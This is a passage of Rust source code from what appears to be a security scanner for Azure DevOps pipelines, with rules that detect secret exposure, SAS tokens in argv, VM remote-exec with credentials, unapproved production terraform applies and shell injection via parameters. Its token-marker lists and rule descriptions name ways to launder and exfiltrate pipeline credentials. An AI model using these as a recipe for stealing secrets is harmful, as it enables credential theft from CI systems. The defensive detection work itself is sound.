/// a line whose left-hand side looks like a shell-variable assignment:
///   - `export FOO=$(SECRET)`
///   - `FOO="$(SECRET)"`
///   - `$X = "$(SECRET)"` / `$env:X = "$(SECRET)"`
///   - `set -a` followed by an assignment is a softer signal but still flagged
///
/// Returns false when `$(secret)` is part of a command-line argument
/// (e.g. `terraform plan -var "k=$(SECRET)"`) — that's covered by other rules.
fn script_assigns_secret_to_shell_var(script: &str, secret: &str) -> bool {
    let needle = format!("$({secret})");
    for line in script.lines() {
        if !line.contains(&needle) {
            continue;
        }
        // Strip everything from `$(secret)` rightward — we only inspect what
        // comes before it on this line.
        let lhs = match line.find(&needle) {
            Some(pos) => &line[..pos],
            None => continue,
        };
        let trimmed = lhs.trim_start();

        // bash/sh: `export VAR=`, `VAR=`, `set VAR=`, `declare VAR=`
        // Look for `<word>=` (no space allowed before `=`) and no leading
        // command pipe / non-assignment indicator.
        if matches_bash_assignment(trimmed) {
            return true;
        }

        // PowerShell: `$VAR = "..."`, `$env:VAR = "..."`, `${VAR} = "..."`,
        // `Set-Variable -Name X -Value "$(SECRET)"`.
        if matches_powershell_assignment(trimmed) {
            return true;
        }
    }
    false
}

/// Returns true if `body` contains any of the SAS-mint token substrings.
fn body_mints_sas(body_lower: &str) -> bool {
    SAS_MINT_TOKENS.iter().any(|t| body_lower.contains(t))
}

/// Returns true if `body` contains any of the VM remote-exec tool substrings.
fn body_uses_vm_remote_exec(body_lower: &str) -> bool {
    VM_REMOTE_EXEC_TOKENS.iter().any(|t| body_lower.contains(t))
}

/// Returns true if `body` contains any command-line sink keyword.
fn body_has_cmdline_sink(body_lower: &str) -> bool {
    COMMAND_LINE_SINK_TOKENS
        .iter()
        .any(|t| body_lower.contains(t))
}

/// Extract names of PowerShell variables that are bound to a SAS-mint result.
/// Pattern: `$<name> = New-AzStorage...SASToken ...` (case-insensitive).
/// Returns the variable names without the leading `$`.
fn powershell_sas_assignments(body: &str) -> Vec<String> {
    let mut out = Vec::new();
    let lower = body.to_lowercase();
    let bytes = lower.as_bytes();
    let mut i = 0usize;
    while i < bytes.len() {
        if bytes[i] != b'$' {
            i += 1;
            continue;
        }
        // Read identifier
        let name_start = i + 1;
        let mut j = name_start;
        while j < bytes.len() {
            let c = bytes[j];
            if c.is_ascii_alphanumeric() || c == b'_' {
                j += 1;
            } else {
                break;
            }
        }
        if j == name_start {
            i += 1;
            continue;
        }
        // Skip whitespace, then expect `=`
        let mut k = j;
        while k < bytes.len() && (bytes[k] == b' ' || bytes[k] == b'\t') {
            k += 1;
        }
        if k >= bytes.len() || bytes[k] != b'=' {
            i = j;
            continue;
        }
        // Skip `=` and whitespace
        k += 1;
        while k < bytes.len() && (bytes[k] == b' ' || bytes[k] == b'\t') {
            k += 1;
        }
        // Look at the rest of this logical line (until `\n`).
        let line_end = lower[k..].find('\n').map(|p| k + p).unwrap_or(bytes.len());
        let rhs = &lower[k..line_end];
        if SAS_MINT_TOKENS.iter().any(|t| rhs.contains(t)) {
            // Recover original-case variable name from `body` at the same byte
            // offsets — `lower` and `body` share UTF-8 byte layout for ASCII,
            // and identifiers in PowerShell are ASCII in the corpus.
            let name = body
                .get(name_start..j)
                .unwrap_or(&lower[name_start..j])
                .to_string();
            if !out.iter().any(|n: &String| n.eq_ignore_ascii_case(&name)) {
                out.push(name);
            }
        }
        i = j;
    }
    out
}

/// Rule: pipeline step uses an Azure VM remote-execution primitive
/// (Set-AzVMExtension/CustomScriptExtension, Invoke-AzVMRunCommand,
/// `az vm run-command invoke`, `az vm extension set`) where the executed
/// command line is constructed from a pipeline secret or a freshly-minted
/// SAS token.
///
/// Pipeline-to-VM lateral movement primitive: every pipeline run can RCE every
/// VM in scope, and the SAS/secret embedded in the command line is logged in
/// plaintext on the VM and in the ARM extension status JSON.
///
/// Detection: read each Step's `META_SCRIPT_BODY`. If the body contains a
/// remote-exec tool name AND (it interpolates a known pipeline secret variable
/// OR it mints a SAS token in the same body), fire one finding per step.
pub fn vm_remote_exec_via_pipeline_secret(graph: &AuthorityGraph) -> Vec<Finding> {
    let mut findings = Vec::new();

    for step in graph.nodes_of_kind(NodeKind::Step) {
        let body = match step.metadata.get(META_SCRIPT_BODY) {
            Some(b) if !b.is_empty() => b,
            _ => continue,
        };
        let body_lower = body.to_lowercase();
        if !body_uses_vm_remote_exec(&body_lower) {
            continue;
        }

        let secret_names = step_secret_var_names(graph, step.id);
        let secret_interpolated = secret_names
            .iter()
            .any(|name| body_interpolates_var(body, name));
        let mints_sas = body_mints_sas(&body_lower);

        if !secret_interpolated && !mints_sas {
            continue;
        }

        // Pick a single tool name for the message.
        let tool = VM_REMOTE_EXEC_TOKENS
            .iter()
            .find(|t| body_lower.contains(*t))
            .copied()
            .unwrap_or("Set-AzVMExtension");

        let trigger = if secret_interpolated {
            "interpolating a pipeline secret into the executed command line"
        } else {
            "embedding a freshly-minted SAS token into the executed command line"
        };

        let mut nodes_involved = vec![step.id];
        // Include the secret nodes the step has access to so consumers can
        // attribute the finding to the leaked credential.
        for edge in graph.edges_from(step.id) {
            if edge.kind == EdgeKind::HasAccessTo {
                if let Some(n) = graph.node(edge.to) {
                    if n.kind == NodeKind::Secret {
                        nodes_involved.push(n.id);
                    }
                }
            }
        }

        findings.push(Finding {
            severity: Severity::High,
            category: FindingCategory::VmRemoteExecViaPipelineSecret,
            path: None,
            nodes_involved,
            message: format!(
                "Step '{}' uses {} {} — pipeline-to-VM RCE primitive; credential is logged on the VM and in ARM extension status",
                step.name, tool, trigger
            ),
            recommendation: Recommendation::Manual {
                action: "Stage the script on the VM and pass the SAS via env var or protectedSettings (encrypted, not logged); avoid embedding secrets in commandToExecute".into(),
            },
            source: FindingSource::BuiltIn,
                extras: FindingExtras::default(),
});
    }

    findings
}

/// Heuristic: line prefix looks like a bash/sh assignment to an env var.
/// Conservative — only matches when the LHS contains `<keyword>? IDENT=` and
/// nothing after the `=` other than optional opening quote characters.
fn matches_bash_assignment(lhs: &str) -> bool {
    // `export FOO=`, `declare FOO=`, `local FOO=`, `readonly FOO=`, plain `FOO=`
    let after_keyword = strip_one_of(lhs, &["export ", "declare ", "local ", "readonly "])
        .unwrap_or(lhs)
        .trim_start();
    // Allow trailing opening-quote characters between `=` and the secret ref.
    let trimmed = after_keyword.trim_end_matches(['"', '\'']);
    let Some(ident) = trimmed.strip_suffix('=') else {
        return false;
    };
    !ident.is_empty()
        && ident.chars().all(is_shell_var_char)
        && !ident.starts_with(|c: char| c.is_ascii_digit())
}

/// Heuristic: line prefix looks like a PowerShell assignment.
fn matches_powershell_assignment(lhs: &str) -> bool {
    // Strip trailing opening quote and whitespace so `$x = "$(SECRET)` matches.
    let trimmed = lhs.trim_end().trim_end_matches(['"', '\'']).trim_end();
    if let Some(before_eq) = trimmed.strip_suffix('=') {
        let before_eq = before_eq.trim_end();
        if before_eq.starts_with('$') {
            return true;
        }
    }
    // `Set-Variable ... -Value`
    if trimmed.contains("Set-Variable") && trimmed.contains("-Value") {
        return true;
    }
    false
}

fn is_shell_var_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || c == '_'
}

fn strip_one_of<'a>(s: &'a str, prefixes: &[&str]) -> Option<&'a str> {
    for p in prefixes {
        if let Some(rest) = s.strip_prefix(p) {
            return Some(rest);
        }
    }
    None
}

/// Rule: pipeline secret exported via shell variable inside an inline script.
///
/// Severity: High. ADO masks the literal token `$(SECRET)` when it appears in
/// log output, but masking happens on the rendered command string before the
/// shell runs. Once the value is bound to a shell variable, downstream
/// transcripts (`Start-Transcript`, `bash -x`, terraform `TF_LOG=DEBUG`,
/// `az --debug`) print the cleartext.
pub fn secret_to_inline_script_env_export(graph: &AuthorityGraph) -> Vec<Finding> {
    let mut findings = Vec::new();

    for step in graph.nodes_of_kind(NodeKind::Step) {
        let Some(script) = step.metadata.get(META_SCRIPT_BODY) else {
            continue;
        };
        if script.is_empty() {
            continue;
        }
        let secrets = step_secret_names(graph, step.id);
        let exposed: Vec<String> = secrets
            .into_iter()
            .filter(|s| script_assigns_secret_to_shell_var(script, s))
            .collect();

        if exposed.is_empty() {
            continue;
        }

        let n = exposed.len();
        let preview: String = exposed
            .iter()
            .take(3)
            .map(|s| format!("$({s})"))
            .collect::<Vec<_>>()
            .join(", ");
        let suffix = if n > 3 {
            format!(", and {} more", n - 3)
        } else {
            String::new()
        };
        let secret_node_ids: Vec<NodeId> = graph
            .edges_from(step.id)
            .filter(|e| e.kind == EdgeKind::HasAccessTo)
            .filter_map(|e| graph.node(e.to))
            .filter(|n| n.kind == NodeKind::Secret && exposed.contains(&n.name))
            .map(|n| n.id)
            .collect();

        let mut nodes_involved = vec![step.id];
        nodes_involved.extend(secret_node_ids);

        findings.push(Finding {
            severity: Severity::High,
            category: FindingCategory::SecretToInlineScriptEnvExport,
            path: None,
            nodes_involved,
            message: format!(
                "Step '{}' assigns pipeline secret(s) {preview}{suffix} to shell variables inside an inline script — once bound to a variable the value bypasses ADO's $(SECRET) log mask and will appear in any transcript (Start-Transcript, bash -x, terraform/az --debug)",
                step.name
            ),
            recommendation: Recommendation::TsafeRemediation {
                command: "tsafe exec --ns <scoped-namespace> -- <command>".to_string(),
                explanation: "Inject the secret as an env var on the step itself (ADO `env:` block) instead of materialising it inside the script body. The value still reaches the process but never travels through a shell variable assignment that transcripts can capture.".to_string(),
            },
            source: FindingSource::BuiltIn,
                extras: FindingExtras::default(),
});
    }

    findings
}

/// How a `resources.repositories[].ref` value resolves for the purposes of
/// the `template_extends_unpinned_branch` rule.
enum RepositoryRefClass {
    /// SHA-pinned, tag-pinned — code at the consumer is immutable.
    Pinned,
    /// No `ref:` field — resolves to the repo's default branch.
    DefaultBranch,
    /// `refs/heads/<name>` or bare branch — mutable.
    MutableBranch(String),
}

fn classify_repository_ref(ref_value: Option<&str>) -> RepositoryRefClass {
    let raw = match ref_value {
        None => return RepositoryRefClass::DefaultBranch,
        Some(s) if s.trim().is_empty() => return RepositoryRefClass::DefaultBranch,
        Some(s) => s.trim(),
    };

    // Bare 40+ hex SHA — pinned.
    if is_hex_sha(raw) {
        return RepositoryRefClass::Pinned;
    }

    // refs/tags/<x> — pinned.
    if let Some(tag) = raw.strip_prefix("refs/tags/") {
        if !tag.is_empty() {
            return RepositoryRefClass::Pinned;
        }
    }

    // refs/heads/<x> — mutable, unless trailing segment is a SHA.
    if let Some(branch) = raw.strip_prefix("refs/heads/") {
        if is_hex_sha(branch) {
            return RepositoryRefClass::Pinned;
        }
        return RepositoryRefClass::MutableBranch(branch.to_string());
    }

    // Bare value — treat as a branch name.
    RepositoryRefClass::MutableBranch(raw.to_string())
}

fn is_hex_sha(s: &str) -> bool {
    s.len() >= 40 && s.chars().all(|c| c.is_ascii_hexdigit())
}

/// Rule: a SAS token minted in-pipeline is passed as a CLI argument or
/// interpolated into `commandToExecute` / `scriptArguments` / `--arguments` /
/// `-ArgumentList` rather than via env var or stdin.
///
/// Even short-lived SAS tokens in argv hit Linux `/proc/*/cmdline`, Windows
/// ETW process-create events, and ARM extension status — logged for the
/// SAS lifetime.
///
/// Detection: read each Step's `META_SCRIPT_BODY`. Body must (a) mint a SAS
/// token AND (b) reference a command-line sink keyword. Heuristic acceptable:
/// the goal is to catch the corpus pattern, not perfect specificity.
pub fn short_lived_sas_in_command_line(graph: &AuthorityGraph) -> Vec<Finding> {
    let mut findings = Vec::new();

    for step in graph.nodes_of_kind(NodeKind::Step) {
        let body = match step.metadata.get(META_SCRIPT_BODY) {
            Some(b) if !b.is_empty() => b,
            _ => continue,
        };
        let body_lower = body.to_lowercase();

        if !body_mints_sas(&body_lower) {
            continue;
        }
        if !body_has_cmdline_sink(&body_lower) {
            continue;
        }

        // Tighten precision: at least one minted-SAS variable must actually
        // appear interpolated somewhere in the script body. This filters out
        // scripts that mint a SAS purely for upload-to-blob and never put it
        // on argv.
        let sas_vars = powershell_sas_assignments(body);
        let mut interpolated_var: Option<String> = None;
        for v in &sas_vars {
            if body_interpolates_var(body, v) {
                interpolated_var = Some(v.clone());
                break;
            }
        }
        // If we couldn't bind a SAS var (e.g. inline `az`-CLI subshell), fall
        // back to "mint+sink in same script" — still better than no signal.
        let evidence = interpolated_var
            .as_deref()
            .map(|v| format!("$ {v} interpolated into argv"))
            .unwrap_or_else(|| "SAS-mint and command-line sink in same script".to_string());

        findings.push(Finding {
            severity: Severity::Medium,
            category: FindingCategory::ShortLivedSasInCommandLine,
            path: None,
            nodes_involved: vec![step.id],
            message: format!(
                "Step '{}' mints a SAS token and passes it on the command line ({}) — argv lands in /proc, ETW, and ARM extension status for the token's lifetime",
                step.name, evidence
            ),
            recommendation: Recommendation::Manual {
                action: "Pass the SAS via env var, stdin, or VM-extension protectedSettings; never put SAS tokens in commandToExecute / --arguments / -ArgumentList".into(),
            },
            source: FindingSource::BuiltIn,
                extras: FindingExtras::default(),
});
    }

    findings
}

/// Returns true if `line` contains a sink that writes its left-hand-side
/// content to a file path. Recognises the common bash and PowerShell
/// "write to file" idioms.
fn line_writes_to_file(line: &str) -> bool {
    // bash: `>`, `>>`, `tee`, `cat <<`/`<<-` heredoc redirected with `>`
    if line.contains(" > ")
        || line.contains(" >> ")
        || line.contains(">/")
        || line.contains(">>/")
        || line.contains("| tee ")
        || line.contains("| tee -")
        || line.starts_with("tee ")
    {
        return true;
    }
    // PowerShell: Out-File, Set-Content, Add-Content, [IO.File]::WriteAllText
    let lower = line.to_lowercase();
    if lower.contains("out-file")
        || lower.contains("set-content")
        || lower.contains("add-content")
        || lower.contains("writealltext")
        || lower.contains("writealllines")
    {
        return true;
    }
    false
}

/// Returns true if `line` references a workspace path or a config-file
/// extension we consider risky for secret materialisation.
fn line_references_workspace_path(line: &str) -> bool {
    let lower = line.to_lowercase();
    if lower.contains("$(system.defaultworkingdirectory)")
        || lower.contains("$(build.sourcesdirectory)")
        || lower.contains("$(pipeline.workspace)")
        || lower.contains("$(agent.builddirectory)")
        || lower.contains("$(agent.tempdirectory)")
    {
        return true;
    }
    // Common credential / config file extensions
    const RISKY_EXT: &[&str] = &[
        ".tfvars",
        ".env",
        ".hcl",
        ".pfx",
        ".key",
        ".pem",
        ".crt",
        ".p12",
        ".kubeconfig",
        ".jks",
        ".keystore",
    ];
    RISKY_EXT.iter().any(|ext| lower.contains(ext))
}

/// Heuristic: returns true if `script` materialises `secret` to a workspace
/// file. Looks for a single line that contains the secret reference AND a
/// "write to file" sink AND a workspace/credfile path target.
///
/// Also detects the heredoc + Out-File pattern across multiple lines:
/// the secret appears inside a `@" ... "@` block whose final pipe is
/// `Out-File <workspace-path>`.
fn script_materialises_secret_to_file(script: &str, secret: &str) -> bool {
    let needle = format!("$({secret})");

    // Pass 1: single-line write. Catches `echo $(SECRET) > /tmp/x.env`,
    // `Out-File ... $(SECRET) ...`, etc.
    for line in script.lines() {
        if line.contains(&needle)
            && line_writes_to_file(line)
            && line_references_workspace_path(line)
        {
            return true;
        }
    }

    // Pass 2: PowerShell pattern `$X = "$(SECRET)"` followed by the variable
    // being piped into Out-File / Set-Content with a workspace path. We
    // detect this conservatively: if any line assigns `$x = "$(SECRET)"`
    // AND any *later* line both writes-to-file and references a workspace
    // path, we flag it. False-positive risk is low because the ASLR-style
    // `$x` typically won't be reused for unrelated content within the same
    // inline block.
    let mut secret_bound_to_var = false;
    for line in script.lines() {
        let trimmed = line.trim();
        if !secret_bound_to_var
            && trimmed.contains(&needle)
            && trimmed.starts_with('$')
            && trimmed.contains('=')
        {
            secret_bound_to_var = true;
            continue;
        }
        if secret_bound_to_var && line_writes_to_file(line) && line_references_workspace_path(line)
        {
            return true;
        }
    }

    false
}

/// Rule: pipeline secret materialised to a file under the agent workspace.
///
/// Severity: High. Files written under `$(System.DefaultWorkingDirectory)` /
/// `$(Build.SourcesDirectory)` survive the writing step's lifetime, are
/// uploaded by `PublishPipelineArtifact` tasks (sometimes accidentally), and
/// remain readable by every subsequent step in the same job.
pub fn secret_materialised_to_workspace_file(graph: &AuthorityGraph) -> Vec<Finding> {
    let mut findings = Vec::new();

    for step in graph.nodes_of_kind(NodeKind::Step) {
        let Some(script) = step.metadata.get(META_SCRIPT_BODY) else {
            continue;
        };
        if script.is_empty() {
            continue;
        }
        let secrets = step_secret_names(graph, step.id);
        let materialised: Vec<String> = secrets
            .into_iter()
            .filter(|s| script_materialises_secret_to_file(script, s))
            .collect();

        if materialised.is_empty() {
            continue;
        }

        let n = materialised.len();
        let preview: String = materialised
            .iter()
            .take(3)
            .map(|s| format!("$({s})"))
            .collect::<Vec<_>>()
            .join(", ");
        let suffix = if n > 3 {
            format!(", and {} more", n - 3)
        } else {
            String::new()
        };

        let secret_node_ids: Vec<NodeId> = graph
            .edges_from(step.id)
            .filter(|e| e.kind == EdgeKind::HasAccessTo)
            .filter_map(|e| graph.node(e.to))
            .filter(|n| n.kind == NodeKind::Secret && materialised.contains(&n.name))
            .map(|n| n.id)
            .collect();

        let mut nodes_involved = vec![step.id];
        nodes_involved.extend(secret_node_ids);

        findings.push(Finding {
            severity: Severity::High,
            category: FindingCategory::SecretMaterialisedToWorkspaceFile,
            path: None,
            nodes_involved,
            message: format!(
                "Step '{}' writes pipeline secret(s) {preview}{suffix} to a file under the agent workspace — the file persists for the rest of the job, is readable by every subsequent step, and may be uploaded by PublishPipelineArtifact",
                step.name
            ),
            recommendation: Recommendation::Manual {
                action: "Replace inline secret materialisation with the `secureFile` task (downloaded to a temp dir with 0600 perms and auto-deleted), or pass the secret to the consuming tool over stdin / an env var instead of via a workspace file. If a file is unavoidable, write under `$(Agent.TempDirectory)` and `chmod 600` immediately.".into(),
            },
            source: FindingSource::BuiltIn,
                extras: FindingExtras::default(),
});
    }

    findings
}

/// Returns true if `script` contains a Key Vault → plaintext extraction
/// pattern that lands the secret in a non-`SecureString` variable.
fn script_extracts_keyvault_to_plaintext(script: &str) -> bool {
    let lower = script.to_lowercase();
    // New syntax: Get-AzKeyVaultSecret ... -AsPlainText
    if lower.contains("get-azkeyvaultsecret") && lower.contains("-asplaintext") {
        return true;
    }
    // ConvertFrom-SecureString ... -AsPlainText (PS 7+) — flat plaintext extraction
    if lower.contains("convertfrom-securestring") && lower.contains("-asplaintext") {
        return true;
    }
    // Old syntax: ($x = (Get-AzKeyVaultSecret ...).SecretValueText)
    if lower.contains("get-azkeyvaultsecret") && lower.contains(".secretvaluetext") {
        return true;
    }
    // Even older: BSTR pattern — ConvertToString on PtrToStringAuto
    if lower.contains("get-azkeyvaultsecret") && lower.contains("ptrtostringauto") {
        return true;
    }
    false
}

/// Rule: PowerShell pulls a Key Vault secret as plaintext inside an inline
/// script. The value never crosses the ADO variable-group boundary so
/// pipeline log masking does not apply — verbose `Az` / PowerShell logging
/// (`Set-PSDebug -Trace`, `$VerbosePreference = "Continue"`, error stack
/// traces) will print the cleartext credential.
///
/// Severity: Medium. Lower than the materialisation rules because the value
/// is at least kept in process memory (vs. on disk), but still a real
/// exposure path that pipeline-level secret rotation alone does not fix.
pub fn keyvault_secret_to_plaintext(graph: &AuthorityGraph) -> Vec<Finding> {
    let mut findings = Vec::new();

    for step in graph.nodes_of_kind(NodeKind::Step) {
        let Some(script) = step.metadata.get(META_SCRIPT_BODY) else {
            continue;
        };
        if script.is_empty() {
            continue;
        }
        if !script_extracts_keyvault_to_plaintext(script) {
            continue;
        }

        findings.push(Finding {
            severity: Severity::Medium,
            category: FindingCategory::KeyVaultSecretToPlaintext,
            path: None,
            nodes_involved: vec![step.id],
            message: format!(
                "Step '{}' extracts a Key Vault secret as plaintext inside an inline script (-AsPlainText / .SecretValueText) — value bypasses ADO variable-group masking and is printed by Az verbose logging or any error stack trace",
                step.name
            ),
            recommendation: Recommendation::Manual {
                action: "Keep the secret as a `SecureString`: drop `-AsPlainText`, pass the SecureString directly to cmdlets that accept it (e.g. `New-PSCredential`, `Connect-AzAccount -ServicePrincipal -Credential ...`), and only convert to plaintext at the moment of consumption, scoped to a single expression. For values that must be plaintext (REST calls, env vars) prefer ADO variable groups linked to Key Vault — the value then participates in pipeline log masking.".into(),
            },
            source: FindingSource::BuiltIn,
                extras: FindingExtras::default(),
});
    }

    findings
}

/// Returns true when `name` (case-insensitive) looks like a production
/// service-connection name. Matches `prod` / `production` / `prd` either as
/// the entire name, a token surrounded by `-`/`_`, or a leading/trailing
/// segment (`prod-foo`, `foo-prd`). Conservative: avoids matching
/// substrings like "approver" or "reproduce".
fn looks_like_prod_connection(name: &str) -> bool {
    let lower = name.to_lowercase();
    let token_match = |s: &str| {
        lower == s
            || lower.contains(&format!("-{s}-"))
            || lower.contains(&format!("_{s}_"))
            || lower.ends_with(&format!("-{s}"))
            || lower.ends_with(&format!("_{s}"))
            || lower.starts_with(&format!("{s}-"))
            || lower.starts_with(&format!("{s}_"))
    };
    token_match("prod") || token_match("production") || token_match("prd")
}

/// Returns true when an inline script body looks like it laundering federated
/// SPN/OIDC token material into a pipeline variable via
/// `##vso[task.setvariable]`. Used to escalate addspn_with_inline_script's
/// message wording when explicit laundering is detected.
fn script_launders_spn_token(s: &str) -> bool {
    let lower = s.to_lowercase();
    if !lower.contains("##vso[task.setvariable") {
        return false;
    }
    let token_markers = [
        "$env:idtoken",
        "$env:serviceprincipalkey",
        "$env:serviceprincipalid",
        "$env:tenantid",
        "arm_oidc_token",
        "arm_client_id",
        "arm_client_secret",
        "arm_tenant_id",
    ];
    token_markers.iter().any(|m| lower.contains(m))
}

/// Rule: `terraform apply -auto-approve` against a production service
/// connection without an environment approval gate.
///
/// Combines three signals on a Step node:
///   1. `META_TERRAFORM_AUTO_APPROVE` = "true" (set by the parser when an
///      inline script runs `terraform apply --auto-approve`, or a
///      `TerraformCLI@N` task has `command: apply` + commandOptions
///      containing `auto-approve`).
///   2. `META_SERVICE_CONNECTION_NAME` matches a production-named pattern
///      (`prod`, `production`, `prd`), OR the step is linked via
///      `HasAccessTo` to an Identity service-connection node whose name
///      matches that pattern.
///   3. The step is NOT inside an `environment:`-bound deployment job
///      (parser sets `META_ENV_APPROVAL` for those steps).
///
/// Severity: Critical. Bypasses the only ADO-side change-control on
/// infra rewrites.
pub fn terraform_auto_approve_in_prod(graph: &AuthorityGraph) -> Vec<Finding> {
    let mut findings = Vec::new();

    for step in graph.nodes_of_kind(NodeKind::Step) {
        let auto_approve = step
            .metadata
            .get(META_TERRAFORM_AUTO_APPROVE)
            .map(|v| v == "true")
            .unwrap_or(false);
        if !auto_approve {
            continue;
        }

        // Step's own service-connection name (set by parser from
        // azureSubscription / connectedServiceName / etc).
        let direct_conn = step.metadata.get(META_SERVICE_CONNECTION_NAME).cloned();

        // Walk HasAccessTo edges to find a service-connection Identity. This
        // catches steps that don't carry the name on themselves but inherit
        // an Identity node via the parser's edge.
        let edge_conn = graph
            .edges_from(step.id)
            .filter(|e| e.kind == EdgeKind::HasAccessTo)
            .filter_map(|e| graph.node(e.to))
            .find(|n| {
                n.kind == NodeKind::Identity
                    && n.metadata
                        .get(META_SERVICE_CONNECTION)
                        .map(|v| v == "true")
                        .unwrap_or(false)
            })
            .map(|n| n.name.clone());

        let conn_name = match direct_conn.or(edge_conn) {
            Some(n) if looks_like_prod_connection(&n) => n,
            _ => continue,
        };

        // Compensating control: an `environment:` binding routes the apply
        // through ADO's approval / check pipeline. Whether that environment
        // *actually* has approvers configured is invisible from YAML — so
        // downgrade Critical → Medium instead of skipping outright (the
        // previous behaviour silently dropped the finding even when the
        // environment was a CI-only approval-free passthrough).
        let env_gated = step
            .metadata
            .get(META_ENV_APPROVAL)
            .map(|v| v == "true")
            .unwrap_or(false);
        let (severity, suffix) = if env_gated {
            (
                Severity::Medium,
                " — `environment:` binding present (verify approvers are configured in the ADO Environments UI)",
            )
        } else {
            (
                Severity::Critical,
                " — any committer can rewrite prod infrastructure",
            )
        };

        findings.push(Finding {
            severity,
            category: FindingCategory::TerraformAutoApproveInProd,
            path: None,
            nodes_involved: vec![step.id],
            message: format!(
                "Step '{}' runs `terraform apply -auto-approve` against production service connection '{}'{}",
                step.name, conn_name, suffix
            ),
            recommendation: Recommendation::Manual {
                action: "Move the apply step into a deployment job whose `environment:` is configured with required approvers in ADO, OR remove `-auto-approve` and run apply behind a manual checkpoint task. Combine with a non-shared agent pool so committers cannot pre-stage payloads.".into(),
            },
            source: FindingSource::BuiltIn,
                extras: FindingExtras::default(),
});
    }

    findings
}

/// Rule: `AzureCLI@2` task with `addSpnToEnvironment: true` AND an inline
/// script body. The inline script can launder federated SPN material
/// (`$env:idToken`, `$env:servicePrincipalKey`, `$env:tenantId`) into normal
/// pipeline variables via `##vso[task.setvariable]`, leaking OIDC tokens to
/// downstream tasks/artifacts un-masked.
///
/// Severity: High. Escalates message wording when the script body contains
/// explicit laundering patterns (`##vso[task.setvariable ...]` writing one
/// of the well-known token env vars or `ARM_OIDC_TOKEN`).
pub fn addspn_with_inline_script(graph: &AuthorityGraph) -> Vec<Finding> {
    let mut findings = Vec::new();

    for step in graph.nodes_of_kind(NodeKind::Step) {
        let add_spn = step
            .metadata
            .get(META_ADD_SPN_TO_ENV)
            .map(|v| v == "true")
            .unwrap_or(false);
        if !add_spn {
            continue;
        }

        let body = match step.metadata.get(META_SCRIPT_BODY) {
            Some(b) if !b.trim().is_empty() => b,
            _ => continue,
        };

        let launders = script_launders_spn_token(body);
        let suffix = if launders {
            " — explicit token laundering detected (##vso[task.setvariable] writes federated token material)"
        } else {
            ""
        };

        findings.push(Finding {
            severity: Severity::High,
            category: FindingCategory::AddSpnWithInlineScript,
            path: None,
            nodes_involved: vec![step.id],
            message: format!(
                "Step '{}' runs an inline script with addSpnToEnvironment:true — the federated SPN (idToken/servicePrincipalKey/tenantId) is exposed to script-controlled code and can be exfiltrated via setvariable{}",
                step.name, suffix
            ),
            recommendation: Recommendation::Manual {
                action: "Replace the inline script with `scriptPath:` pointing to a reviewed file in-repo, OR drop `addSpnToEnvironment: true` and use the task's first-class auth surface. Never emit federated token material via `##vso[task.setvariable]` — those values are inherited by every downstream task and may appear in logs.".into(),
            },
            source: FindingSource::BuiltIn,
                extras: FindingExtras::default(),
});
    }

    findings
}

/// Rule: free-form `type: string` parameter (no `values:` allowlist)
/// interpolated via `${{ parameters.<name> }}` directly into an inline
/// shell/PowerShell script body. ADO does not escape parameter values in
/// YAML emission, so any user with "queue build" can inject shell.
///
/// Detection requires the parser to populate
/// `AuthorityGraph::parameters` (currently ADO only) and to stamp Step
/// nodes with `META_SCRIPT_BODY`.
///
/// Severity: Medium.
pub fn parameter_interpolation_into_shell(graph: &AuthorityGraph) -> Vec<Finding> {
    if graph.parameters.is_empty() {
        return Vec::new();
    }

    // Free-form string parameters: type is `string` (or unspecified — ADO's
    // default) AND no `values:` allowlist.
    let free_form: Vec<&str> = graph
        .parameters
        .iter()
        .filter(|(_, spec)| {
            !spec.has_values_allowlist
                && (spec.param_type.is_empty() || spec.param_type.eq_ignore_ascii_case("string"))
        })
        .map(|(name, _)| name.as_str())
        .collect();

    if free_form.is_empty() {
        return Vec::new();
    }

    let mut findings = Vec::new();

    for step in graph.nodes_of_kind(NodeKind::Step) {
        let body = match step.metadata.get(META_SCRIPT_BODY) {
            Some(b) if !b.is_empty() => b,
            _ => continue,
        };

        // Find every free-form parameter that appears interpolated in the
        // script body. Match both `${{ parameters.X }}` and `${{parameters.X}}`.
        let mut hits: Vec<&str> = Vec::new();
        for &name in &free_form {
            let needle_a = format!("${{{{ parameters.{name} }}}}");
            let needle_b = format!("${{{{parameters.{name}}}}}");
            if body.contains(&needle_a) || body.contains(&needle_b) {
                hits.push(name);
            }
        }

        if hits.is_empty() {
            continue;
        }

        hits.sort();
        hits.dedup();
        let names = hits.join(", ");

        findings.push(Finding {
            severity: Severity::Medium,
            category: FindingCategory::ParameterInterpolationIntoShell,
            path: None,
            nodes_involved: vec![step.id],
            message: format!(
                "Step '{}' interpolates free-form string parameter(s) [{}] into an inline script — anyone with 'queue build' permission can inject shell commands",
                step.name, names
            ),
            recommendation: Recommendation::Manual {
                action: "Add a `values:` allowlist to the parameter declaration to constrain accepted inputs, OR pass the parameter through the step's `env:` block so the runtime quotes it as a shell variable instead of YAML-interpolating raw text.".into(),
            },
            source: FindingSource::BuiltIn,
                extras: FindingExtras::default(),
});
    }

    findings
}

/// Rule: ADO terraform-output → `task.setvariable` → downstream shell
/// expansion, a 2-step injection chain.
///
/// **Phase 1 (capture step):** an inline ADO script body
/// (`META_SCRIPT_BODY`) that contains BOTH:
///   - a "terraform output capture" signal — either a literal `terraform
///     output` CLI invocation (with or without `-raw <name>` / `-json`),
///     OR a reference to a `TF_OUT_*` env var (the standard naming
///     convention for env vars sourced from a `TerraformCLI@*`
///     `command: output` task), AND
///   - a `##vso[task.setvariable variable=NAME ...]VALUE` directive.
///
/// **Phase 2 (sink step):** a *later* Step in the SAME job (matched via
/// `META_JOB_NAME`) whose script body expands `$(NAME)` in
/// shell-expansion position, where "shell-expansion position" is any of:
///   - inside `bash -c "..."` / `bash -c '...'`
///   - inside `eval "..."` / `eval '...'` / `eval $(...)`
///   - inside command substitution `$(... $(NAME) ...)`
///   - PowerShell `-split` / `Invoke-Command` / `Invoke-Expression` / `iex`
///     in the same script
///   - bare unquoted `$(NAME)` as a command word (line-leading)
///
/// **Severity: High.** Terraform state/outputs are often controlled by
/// remote backends (S3 bucket, Azure Storage) whose IAM may have weaker
/// access controls than the pipeline itself. The `task.setvariable` hop
/// launders attacker-controlled state through pipeline-variable space —
/// existing rules see only the in-step view.
pub fn terraform_output_via_setvariable_shell_expansion(graph: &AuthorityGraph) -> Vec<Finding> {
    // Step 0: collect every Step (in graph insertion order, which matches
    // YAML order) that carries a non-empty script body. Group by job name.
    struct StepInfo<'a> {
        id: NodeId,
        name: &'a str,
        body: &'a str,
    }
